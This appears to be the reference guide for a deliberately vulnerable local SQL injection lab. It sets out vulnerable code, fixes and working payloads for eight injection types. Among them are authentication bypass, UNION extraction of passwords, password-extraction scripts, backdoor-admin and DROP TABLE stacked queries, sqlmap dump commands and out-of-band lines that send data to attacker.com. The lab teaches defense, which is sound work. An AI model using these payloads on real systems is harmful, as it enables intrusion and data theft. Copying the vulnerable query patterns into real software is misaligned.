📚 SQL Injection Lab Documentation

Complete reference guide for all 8 vulnerability types

1️⃣ Classic SQL Injection (Authentication Bypass) Critical

Endpoint: POST /login
Root Cause: String concatenation in authentication query without parameterization. 

# Vulnerable Code (app.py)
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
result = db.execute(query).fetchone()
Test Payloads:
Bypass password check
Username: admin' -- | Password: anything
Universal true condition
Username: ' OR '1'='1' -- | Password: anything
Login as first user with LIMIT
Username: ' OR '1'='1' LIMIT 1 -- | Password: anything
🔒 Fix: Use parameterized queries
db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
2️⃣ Union-Based SQL Injection Critical

Endpoint: GET /search?q=...
Root Cause: User input concatenated into SELECT query, allowing UNION to combine results from other tables. 

# Vulnerable Code
query = "SELECT id, name, description, price, category FROM products WHERE name LIKE '%" + query_param + "%'"
Test Payloads:
Extract all users (must match 5 columns)
' UNION SELECT id, username, password, email, role FROM users --
Extract secrets/CTF flag
' UNION SELECT id, secret_key, secret_value, description, 'secrets' FROM secrets --
Discover database schema
' UNION SELECT null, name, sql, null, type FROM sqlite_master --
🔒 Fix: Parameterized queries prevent UNION injection
db.execute("SELECT * FROM products WHERE name LIKE ?", ('%' + q + '%',))
3️⃣ Error-Based SQL Injection High

Endpoint: GET /profile/<user_id>
Root Cause: Unsanitized input in query where SQL errors reveal database structure information. 

# Vulnerable Code
query = "SELECT * FROM users WHERE id = " + user_id
result = db.execute(query).fetchone()
Test Payloads:
Trigger syntax error to see query structure
/profile/1'
Column count discovery via UNION
/profile/1 AND 1=2 UNION SELECT null, null, null, null, null --
Conditional error (division by zero)
/profile/1 AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1
🔒 Fix: Parameterized queries + generic error messages
db.execute("SELECT * FROM users WHERE id = ?", (user_id,))
4️⃣ Boolean-Based Blind SQL Injection High

Endpoint: GET /check-order?id=...
Root Cause: Query result affects visible page content (True = order found, False = not found). 

# Vulnerable Code
query = "SELECT * FROM orders WHERE id = " + order_id
result = db.execute(query).fetchone()
Test Payloads:
Check if admin password starts with 'a'
1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN 1 ELSE 1/0 END)=1
Check password length > 5
1 AND (SELECT length(password) FROM users WHERE username='admin') > 5
🔬 Automation Script (Python): 
import requests

url = "http://127.0.0.1:5000/check-order"
password = ""
for i in range(1, 20):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload = f"1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),{i},1)='{char}') THEN 1 ELSE 1/0 END)=1"
        r = requests.get(url, params={"id": payload})
        if "Order Found" in r.text:
            password += char
            print(f"Found char {i}: {char}")
            break
    else:
        break
print(f"Password: {password}")
5️⃣ Time-Based Blind SQL Injection High

Endpoint: GET /report?id=...
Root Cause: Query execution time can be controlled via SQL functions. SQLite uses randomblob(N) to cause delays. 

# Vulnerable Code
query = "SELECT * FROM products WHERE id = " + product_id
result = db.execute(query).fetchone()
Test Payloads:
Cause delay if password starts with 'a'
1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN randomblob(1000000000) ELSE 1 END)
Heavy delay for True condition
1 AND (SELECT CASE WHEN (SELECT count(*) FROM users WHERE role='admin') > 0 THEN randomblob(500000000) ELSE 1 END)
🔬 Automation Script (Python): 
import requests, time

url = "http://127.0.0.1:5000/report"
password = ""
for i in range(1, 20):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload = f"1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),{i},1)='{char}') THEN randomblob(100000000) ELSE 1 END)"
        start = time.time()
        r = requests.get(url, params={"id": payload})
        elapsed = time.time() - start
        if elapsed > 1.0:  # Delay detected = True
            password += char
            print(f"Found char {i}: {char} (delay: {elapsed:.2f}s)")
            break
    else:
        break
print(f"Password: {password}")
6️⃣ Out-of-Band SQL Injection (Simulated) Medium

Endpoint: GET /api/stats?id=...
Concept: In real scenarios, databases make network requests (DNS/HTTP) to exfiltrate data. SQLite simulates this via query result manipulation.

Simulated Payloads:
Exfiltrate passwords into log results
1 UNION SELECT id, 'EXFIL_' || username, password, 'data_exfil' FROM users
Extract CTF flag
1 UNION SELECT id, 'FLAG_' || secret_key, secret_value, 'exfiltrated' FROM secrets
🌐 Real-World OOB Examples:
  • MySQL: LOAD_FILE(CONCAT('\\attacker.com\', password, '.dns.log'))
  • MSSQL: EXEC master..xp_dirtree '\\attacker.com\test'
  • Oracle: UTL_HTTP.request('http://attacker.com/' || password)
  • PostgreSQL: COPY (SELECT password FROM users) TO PROGRAM 'curl attacker.com'
7️⃣ Second-Order SQL Injection High

Endpoints: POST /feedback (storage) → GET /admin/feedback (execution)
Root Cause: Input stored safely in one query, but later used unsafely in another query. 

# Storage Phase (/feedback) - INSERT is also vulnerable
query = "INSERT INTO feedback (name, email, message) VALUES ('" + name + "', '" + email + "', '" + message + "')"

# Execution Phase (/admin/feedback) - WHERE the stored payload executes!
query = "SELECT * FROM feedback WHERE name = '" + name_filter + "'"
Attack Flow:
  1. Submit payload via /feedback form Name field: ' OR '1'='1' --
  2. Payload is stored in database (appears harmless)
  3. Admin visits /admin/feedback and the stored name is used in a vulnerable query
  4. Query becomes: SELECT * FROM feedback WHERE name = '' OR '1'='1' --'
  5. All feedback entries returned, including unapproved ones!
🔒 Fix: Sanitize at point of use, not just at storage. Use parameterized queries everywhere.
db.execute("SELECT * FROM feedback WHERE name = ?", (name_filter,))
8️⃣ Stacked Queries SQL Injection Critical

Endpoint: GET /admin?filter=...
Root Cause: Uses executescript() which allows multiple SQL statements separated by semicolons. 

# Vulnerable Code - executescript() allows multiple statements!
query = "SELECT * FROM logs WHERE " + log_filter
cursor = db.executescript(query)
Test Payloads:
Add backdoor admin account
1=1; INSERT INTO users (username, password, email, role) VALUES ('hacker', 'hacked123', 'hacker@evil.com', 'admin'); --
Promote user to admin
1=1; UPDATE users SET role='admin' WHERE username='alice'; --
Delete all data (destructive)
1=1; DELETE FROM orders; -- or 1=1; DROP TABLE feedback; --
🔒 Fix: Never use executescript() with user input. Use execute() with single statements and parameters.
db.execute("SELECT * FROM logs WHERE action = ?", (action_filter,))
🤖 Automated Testing with sqlmap

sqlmap is an open-source penetration testing tool that automates SQL injection detection and exploitation. 

# Install sqlmap
pip install sqlmap

# Test login form (Classic SQLi)
sqlmap -u "http://127.0.0.1:5000/login" --data="username=admin&password=test" --level=5 --risk=3

# Test search parameter (Union-Based SQLi)
sqlmap -u "http://127.0.0.1:5000/search?q=test" --level=5 --risk=3

# Test profile endpoint (Error-Based SQLi)
sqlmap -u "http://127.0.0.1:5000/profile/1" --level=5 --risk=3

# Dump all tables and data
sqlmap -u "http://127.0.0.1:5000/search?q=test" --dump-all

# Get current database user
sqlmap -u "http://127.0.0.1:5000/search?q=test" --current-user

# Get database banner (version)
sqlmap -u "http://127.0.0.1:5000/search?q=test" --banner

# Test time-based blind SQLi
sqlmap -u "http://127.0.0.1:5000/report?id=1" --technique=T --level=5

# Test boolean-based blind SQLi
sqlmap -u "http://127.0.0.1:5000/check-order?id=1" --technique=B --level=5
